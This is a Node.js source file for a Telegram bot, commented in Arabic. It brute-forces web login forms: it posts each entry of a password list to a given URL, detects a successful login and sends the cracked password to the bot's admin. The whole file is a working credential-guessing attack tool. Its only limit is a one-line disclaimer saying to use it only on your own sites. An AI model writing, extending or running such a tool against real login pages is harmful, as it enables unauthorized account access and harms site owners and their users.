const T = require('node-telegram-bot-api');
const A = require('axios');
const fs = require('fs');

// قراءة البيانات
const c = JSON.parse(fs.readFileSync('./data.json'));
const B = new T(c.token, { polling: true });
const adminId = c.admin;

// اسم المستخدم الثابت (عدّله كما تريد)
const FIXED_USERNAME = "احمد سالم";

// حالة الهجمات
const attacks = new Map();
const sleep = ms => new Promise(r => setTimeout(r, ms));

// أوامر البوت
B.onText(/\/start/, (m) => {
    if (m.chat.id != adminId) return;
    B.sendMessage(adminId, 
`🔐 *بوت اختبار كلمات المرور - الإصدار الاحترافي*
📌 اسم المستخدم ثابت: \`${FIXED_USERNAME}\`

*الأوامر:*
/atk <url> <passField> <successText> <delayMS>
مثال:
\`/atk https://mysite.com/login password "Dashboard" 500\`

/stop – إيقاف الهجوم
/pswd – عرض أول 30 كلمة مرور

⚠️ استخدم فقط على مواقعك الشخصية.`, { parse_mode: 'Markdown' });
});

// أمر الهجوم (بدون الحاجة لإرسال اسم المستخدم)
B.onText(/\/atk (.+?) (.+?) (.+?) (.+)/, async (m, match) => {
    if (m.chat.id != adminId) return;
    const [_, url, passField, okText, delayStr] = match;
    let delay = parseInt(delayStr);
    if (isNaN(delay) || delay < 200) {
        return B.sendMessage(adminId, '❌ التأخير يجب أن يكون رقماً >= 200 مللي ثانية');
    }

    // قراءة قائمة كلمات المرور
    let pwdList = [];
    try {
        const pwdFile = fs.readFileSync('./passwords.txt', 'utf8');
        pwdList = pwdFile.split('\n').filter(l => l.trim().length > 0);
    } catch (err) {
        return B.sendMessage(adminId, '❌ ملف passwords.txt غير موجود أو فارغ');
    }
    if (pwdList.length === 0) return B.sendMessage(adminId, '❌ لا توجد كلمات مرور في الملف');

    attacks.set(adminId, true);
    B.sendMessage(adminId, 
`🚀 *بدء الهجوم*
🌐 الهدف: ${url}
👤 اسم المستخدم: \`${FIXED_USERNAME}\`
🔑 عدد كلمات المرور: ${pwdList.length}
⏱ التأخير: ${delay}ms
سأبلغك عند العثور على كلمة صحيحة.`);

    for (let i = 0; i < pwdList.length; i++) {
        if (!attacks.get(adminId)) {
            B.sendMessage(adminId, '⏹ تم إيقاف الهجوم بواسطتك');
            attacks.delete(adminId);
            return;
        }
        const pwd = pwdList[i];
        try {
            const response = await A({
                method: 'post',
                url: url,
                data: {
                    [passField]: pwd
                },
                maxRedirects: 0,
                validateStatus: s => s < 400
            });
            // نجاح إذا كان الرد 302 أو يحتوي على نص النجاح
            const success = (response.status === 302 && (!response.headers.location || !response.headers.location.includes('error'))) ||
                            (response.data && response.data.includes(okText));
            if (success) {
                B.sendMessage(adminId, `✅ *نجاح!* كلمة المرور الصحيحة: \`${pwd}\``, { parse_mode: 'Markdown' });
                attacks.delete(adminId);
                return;
            }
            // تحديث التقدم كل 10 محاولات
            if (i % 10 === 0 || i === pwdList.length - 1) {
                B.sendMessage(adminId, `🔍 جربت ${i+1}/${pwdList.length} ... آخر محاولة: ${pwd}`);
            }
            await sleep(delay);
        } catch (err) {
            B.sendMessage(adminId, `⚠️ خطأ في الاتصال: ${err.message}`);
            attacks.delete(adminId);
            return;
        }
    }
    B.sendMessage(adminId, '❌ لم يتم العثور على كلمة مرور صحيحة في القائمة');
    attacks.delete(adminId);
});

// إيقاف الهجوم
B.onText(/\/stop/, (m) => {
    if (m.chat.id != adminId) return;
    if (attacks.has(adminId)) {
        attacks.set(adminId, false);
        B.sendMessage(adminId, '🛑 جاري إيقاف الهجوم بعد المحاولة الحالية...');
    } else {
        B.sendMessage(adminId, '⚠️ لا يوجد هجوم نشط');
    }
});

// عرض قائمة كلمات المرور
B.onText(/\/pswd/, (m) => {
    if (m.chat.id != adminId) return;
    let pwdList = [];
    try {
        pwdList = fs.readFileSync('./passwords.txt', 'utf8').split('\n').filter(l => l.trim());
    } catch(e) {}
    if (pwdList.length === 0) return B.sendMessage(adminId, '❌ لا توجد كلمات مرور');
    let list = pwdList.slice(0, 30).join('\n');
    B.sendMessage(adminId, `📜 *أول 30 كلمة مرور:*\n${list}`, { parse_mode: 'Markdown' });
});

console.log('✅ البوت شغال - اسم المستخدم ثابت: ' + FIXED_USERNAME);